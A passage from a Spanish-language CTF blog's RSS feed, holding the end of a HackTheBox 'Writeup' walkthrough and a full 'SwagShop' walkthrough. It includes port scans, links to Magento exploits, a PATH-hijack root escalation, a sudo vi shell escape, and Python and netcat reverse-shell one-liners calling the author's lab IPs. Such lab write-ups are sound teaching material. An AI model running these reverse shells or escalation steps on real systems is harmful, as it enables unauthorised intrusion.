&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;run-parts --lsbsysinit /etc/update-motd.d &amp;gt; /run/motd.dynamic.new 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Buscamos en que carpeta se encuentra run-parts:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/writeup/Screenshot_20190705_210948.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Revisamos la variable &lt;code&gt;PATH&lt;/code&gt; del usuario root y las carpetas donde tenemos permisos de escritura:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Carpetas donde tenemos permisos de escritura:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;find / -writable -type d 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/writeup/Screenshot_20190615_002605.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos una carpeta que el usuario root utiliza en su variable PATH (&lt;code&gt;/usr/local/sbin/&lt;/code&gt;), esta direccion es la primera que se utiliza para poder &amp;ldquo;encontrar&amp;rdquo; los programas/scripts/etc que se escriban en la terminal de comandos, en este caso la primera direccion donde el usuario root va a buscar &lt;strong&gt;run-parts&lt;/strong&gt; es &lt;code&gt;/usr/local/sbin/&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Sabiendo esto, podemos escribir un comando/reverse shell dentro de &lt;code&gt;/usr/local/sbin/run-parts&lt;/code&gt; el cual va ser ejecutado por el usuario root. Vamos hacer una prueba con un ping hacia nuestra maquina:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo &amp;quot;/bin/ping -c 2 10.10.15.122&amp;quot; &amp;gt; /usr/local/sbin/run-parts &amp;amp;&amp;amp; chmod +x /usr/local/sbin/run-parts
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;La respuesta la vemos reflejada con tcpdump:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/writeup/Screenshot_20190705_212608.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora que tuvimos una respuesta de la maquina vamos a agregar nuestra shell inversa al archivo y vamos a poner a la escucha netcat localmente:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34; python -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&amp;#34;10.10.15.122\&amp;#34;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&amp;#34;/bin/sh\&amp;#34;,\&amp;#34;-i\&amp;#34;]);&amp;#39; &amp;#34;&lt;/span&gt; &amp;gt; /usr/local/sbin/run-parts &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; chmod +x /usr/local/sbin/run-parts
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/writeup/Screenshot_20190705_213930.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos nuestra shell inversa como usuario root y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/writeup/Screenshot_20190705_214017.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/writeup/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/writeup/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>windows</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - SwagShop</title>
        <link>https://sckull.github.io/posts/swagshop/</link>
        <pubDate>Sat, 28 Sep 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 28 Sep 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/swagshop/</guid>
        <description>SwagShop es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;SwagShop es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/swagshop/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;SwagShop&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.140&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/1&#34;&gt;ch4p&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;masscan&#34;&gt;MASSCAN&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos udp/tcp.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/swagshop# masscan -p1-65535,U:1-65535 10.10.10.140 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-05-13 17:43:20 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 22/tcp on 10.10.10.140
Discovered open port 80/tcp on 10.10.10.140
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;EScaneo de puertos 22, 80.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.70 scan initiated Mon May 13 12:54:19 2019 as: nmap -sV -p22,80 -o nmap.scan 10.10.10.140&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.140
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.19s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon May 13 12:54:27 2019 -- 1 IP address (1 host up) scanned in 8.08 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Visitamos la pagina principal y nos muestra una tienda con algunos productos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/swagshop/Screenshot_20190513_115626.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Algunos directorios y paginas encontradas con gobuster.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
Gobuster v2.0.1              OJ Reeves &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Mode         : dir
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Url/Domain   : http://10.10.10.140/
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Threads      : &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Wordlist     : /usr/share/wordlists/dirb/common.txt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Status codes : 200,204,301,302,307,403
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Extensions   : php,txt,html
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Timeout      : &lt;span class=&#34;nv&#34;&gt;10s&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
2019/05/13 13:05:05 Starting &lt;span class=&#34;nv&#34;&gt;gobuster&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
/api.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/app &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/cron.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/downloader &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/errors &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/favicon.ico &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/includes &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/install.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/lib &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/LICENSE.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/LICENSE.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/media &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/pkginfo &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/shell &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/skin &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/var &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
2019/05/13 13:08:09 &lt;span class=&#34;nv&#34;&gt;Finished&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;magento-ecommerce---exploit&#34;&gt;Magento eCommerce - Exploit&lt;/h2&gt;
&lt;p&gt;Al investigar un poco acerca de la plataforma nos encontramos un exploit el cual crea un usuario dentro de la base de datos con permisos de administracion, editamos un poco el exploit especificamente el usuario (&lt;code&gt;username=&amp;quot;sckull&amp;quot;&lt;/code&gt;) y contraseña (&lt;code&gt;password=&amp;quot;sckull&amp;quot;&lt;/code&gt;) para mostrar une explotacion exitosa tambien debemos de cambiar el target con el valor de &lt;code&gt;target = &amp;quot;http://10.10.10.140/index.php&amp;quot;&lt;/code&gt;, mas informacion acerca de esta &lt;a href=&#34;https://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/&#34;&gt;vulnerabilidad&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/37977&#34;&gt;&lt;strong&gt;CVE:2015-1397&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos acceso a la plataforma de Magento como administrador.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/swagshop/Peek%202019-05-13%2021-02.gif&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora que tenemos acceso a la plataforma con nuestras credenciales podemos utilizar un segundo exploit el cual executa comandos en la maquina, para ello debemos de agregar usuario (username) y contraseña (password) que creamos con el anterior exploit de igual forma agregamos la fecha que se encuentra en &lt;code&gt;/app/etc/local.xml&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/37811&#34;&gt;&lt;strong&gt;Magento CE &amp;lt; 1.9.0.1 Post Auth RCE&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/swagshop/Peek%202019-05-13%2021-123123.gif&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;shell---www-data&#34;&gt;SHELL - www-data&lt;/h2&gt;
&lt;p&gt;Ahora que podemos ejecutar comandos por medio de un exploit vamos a obtener una shell inversa.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CMD:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;rm /tmp/f&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;mkfifo /tmp/f&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;cat /tmp/f&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;/bin/sh -i 2&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;1&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;nc 10.10.15.31 &lt;span class=&#34;m&#34;&gt;9090&lt;/span&gt; &amp;gt;/tmp/f
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/swagshop/Screenshot_20190514_001737.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Actualizamos nuestra shell a una mas estable con python.&lt;br /&gt;
&lt;a href=&#34;https://netsec.ws/?p=337&#34;&gt;&lt;strong&gt;SHELL:&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/swagshop/Screenshot_20190514_001849.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Dentro de la carpeta principal del usuario haris encontramos nuestra bandera &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/swagshop/Screenshot_20190514_001935.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h2&gt;
&lt;p&gt;Ahora que tenemos una shell con acceso de privilegio bajo hacemos una pequeña enumeracion de los programas que podamos, por medio del comando sudo ejecutar, encontramos que podemos ejecutar vi con privilegios de administracion.&lt;/p&gt;
&lt;p&gt;Para mostrar los comandos que podemos ejecutar con sudo utilizamos &lt;code&gt;sudo -l&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.andreafortuna.org/2018/05/16/exploiting-sudo-for-linux-privilege-escalation/&#34;&gt;&lt;strong&gt;Sudo - Privilege Escalation&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://blog.securelayer7.net/abusing-sudo-advance-linux-privilege-escalation/&#34;&gt;&lt;strong&gt;Abusing sudo&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/swagshop/Screenshot_20190514_002022.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos vi para poder abrir una shell como root para ello vamos a utilizar un archivo que se encuentra en &lt;code&gt;/var/www/html/&lt;/code&gt; ya que es la direccion donde tiene permitido vi ejecutarse o editar archivos mediante sudo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo /usr/bin/vi /var/www/html/install.php
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Luego de que se habra el editor presionamos la tecla &lt;code&gt;ESC&lt;/code&gt; y escribimos &lt;code&gt;:shell&lt;/code&gt; y se abrira una shell como usario &lt;strong&gt;root&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/swagshop/Peek%202019-05-14%2000-25.gif&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos nuestra bandera &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/swagshop/Screenshot_20190514_002626.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/swagshop/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/swagshop/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Vulnos2</title>
        <link>https://sckull.github.io/posts/vulnos2/</link>
        <pubDate>Thu, 19 Sep 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Thu, 19 Sep 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/vulnos2/</guid>
        <description>Vulnos2 es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
